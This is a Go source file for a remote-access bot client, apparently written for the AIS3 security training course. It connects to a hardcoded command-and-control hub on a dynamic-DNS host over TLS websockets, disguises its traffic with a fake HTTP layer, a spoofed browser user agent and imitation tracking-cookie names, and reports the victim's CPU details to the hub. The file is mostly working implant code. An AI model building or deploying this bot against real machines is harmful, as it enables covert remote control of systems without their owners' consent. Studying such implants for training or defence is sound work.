//go build -ldflags="-s -w" -tags="extra mod" -o bot-all bot.go
package main

import (
	"encoding/base64"
	"runtime"
	"strings"
	"net"
	"net/url"
	"fmt"
	"flag"
	"encoding/json"
	"os"

	"lib/fakehttp"
	kit "local/toolkit"
	"local/base"
)

// default config
const (
	fakeHttp = true
	tls = true
	wsObf = true

	targetUrl = "/"
	tokenCookieA = "cna"
	tokenCookieB = "_tb_token_"
	tokenCookieC = "_cna"
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36"

	defName = "AIS3 TEST BOT"
	defHubAddr = "wss://cs8425.noip.me:8787"
)

var (
	hubPubKey, _ = base64.StdEncoding.DecodeString("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArogYEOHItjtm0wJOX+hSHjGTIPUsRo/TyLGYxWVk79pNWAhCSvH9nfvpx0skefcL/Nd++Qb/zb3c+o7ZI4zbMKZJLim3yaN8IDlgrjKG7wmjB5r49++LrvRzjIJCAoeFog2PfEn3qlQ+PA26TqLsbPNZi9nsaHlwTOqGljg82g23Zqj1o5JfitJvVlRLmhPqc8kO+4Dvf08MdVS6vBGZjzWFmGx9k3rrDoi7tem22MflFnOQhgLJ4/sbd4Y71ok98ChrQhb6SzZKVWN5v7VCuKqhFLmhZuK0z0f/xkBNcMeCplVLhs/gLIU3HBmvbBSYhmN4dDL19cAv1MkQ6lb1dwIDAQAB")

	proc int = runtime.NumCPU() + 2

	hubAddr = flag.String("addr", "", "hub addr")
	clientName = flag.String("name", "", "client name")
	configJson = flag.String("c", "", "config.json")
)

type Config struct {
	Name      string `json:"name,omitempty"`
	HubAddr   string `json:"addr,omitempty"`
	HubPubKey []byte `json:"hubkey,omitempty"` // RSA public key for connect to hub
	MasterKey []byte `json:"masterkey,omitempty"` // ECDSA public key for access
	UserAgent      string `json:"useragent,omitempty"`
}

func parseJSONConfig(config *Config, path string) error {
	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()

	return json.NewDecoder(file).Decode(config)
}

func initBot(c *base.Client) {
	c.Info.Set("NumCPU", fmt.Sprintf("%v", runtime.NumCPU()))

	lines, _ := kit.ReadLines("/proc/cpuinfo")
	for _, line := range lines {
		fields := strings.Split(line, ":")
		if len(fields) < 2 {
			continue
		}
		key := strings.TrimSpace(fields[0])
		value := strings.TrimSpace(fields[1])

		switch key {

		case "model name", "Hardware":
			// ARM : Hardware = Qualcomm Technologies, Inc MSM8939
			// x86: model name = Intel(R) Core(TM) i7-4710HQ CPU @ 2.50GHz
			c.Info.Set("ModelName", value)
		case "flags":
			flist := strings.FieldsFunc(value, func(r rune) bool {
				return r == ',' || r == ' '
			})
			c.Info.Set("flags", strings.Join(flist, ","))


		case "vendorId", "vendor_id", "Processor": // x86, x86, arm
			// ARM : ARMv7 Processor rev 1 (v7l)
			c.Info.Set("VendorID", value)
		}
	}
}

func main() {
	flag.Parse()

	conf := &Config{
		Name: defName,
		HubAddr: defHubAddr,
		HubPubKey: hubPubKey,
		//MasterKey: masterKey,
		UserAgent: userAgent,
	}
	if *configJson != "" {
		err := parseJSONConfig(conf, *configJson)
		if err != nil {
			fmt.Println("[config]parse error", err)
		}
	}
	if *hubAddr != "" {
		conf.HubAddr = *hubAddr
	}
	if *clientName != "" {
		conf.Name = *clientName
	}

	u, err := url.Parse(conf.HubAddr)
	if err != nil {
		fmt.Println("[config]parse addr error", err)
		return
	}
	useFakeHttp := fakeHttp
	useWs := wsObf
	useTLS := tls
	TargetUrl := u.Path //targetUrl
	switch u.Scheme {
	case "http":
		useFakeHttp = true
		useWs = false
		useTLS = false
	case "https":
		useFakeHttp = true
		useWs = false
		useTLS = true
	case "ws":
		useFakeHttp = true
		useWs = true
		useTLS = false
	case "wss":
		useFakeHttp = true
		useWs = true
		useTLS = true
	case "tcp":
		useFakeHttp = false
	default:
	}

	base.RegInit(initBot)

	c := base.NewClientM()
	c.UUID = kit.HashBytes256([]byte(conf.Name))
//	c.AgentTag = "AIS3 TEST BOT"
//	c.HubKeyTag = "HELLO"
	c.HubPubKey = conf.HubPubKey
	c.Daemon = false
	c.AutoClean = true
//	c.Info.Set("AIS3", "test shell XD")
//	c.Info.Set("AIS3-2", "test2")
	c.MasterKey = conf.MasterKey // extra

	c.Proc = proc

	if useFakeHttp {
		mkFn := func(addr string) (*fakehttp.Client) {
			var cl *fakehttp.Client
			if useTLS {
				cl = fakehttp.NewTLSClient(addr, nil, true)
			} else {
				cl = fakehttp.NewClient(addr)
			}
			cl.TokenCookieA = tokenCookieA
			cl.TokenCookieB = tokenCookieB
			cl.TokenCookieC = tokenCookieC
			cl.UseWs = useWs
			cl.UserAgent = conf.UserAgent
			cl.Url = TargetUrl
			return cl
		}
		c.Dial = func(addr string) (net.Conn, error) {
			cl := mkFn(addr)
//			cl.Host = addr
			return cl.Dial()
		}
	}

	fmt.Println("[UUID]", kit.Hex(c.UUID))

	c.Start(u.Host)

}


